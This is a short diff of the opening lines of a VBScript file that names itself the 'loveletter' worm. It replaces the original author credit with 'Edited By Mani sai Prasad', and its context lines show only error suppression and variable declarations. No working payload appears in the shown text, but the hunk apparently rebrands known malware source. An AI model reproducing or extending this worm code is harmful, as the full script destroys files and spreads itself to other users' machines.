@@ -1,5 +1,5 @@
-rem  barok -loveletter(vbe) <i hate go to school> 
- rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines 
+rem  barok -loveletter(vbe) <i hate to love> 
+rem by: Edited By Mani sai Prasad
  On Error Resume Next 
  dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow 
  eq="" 
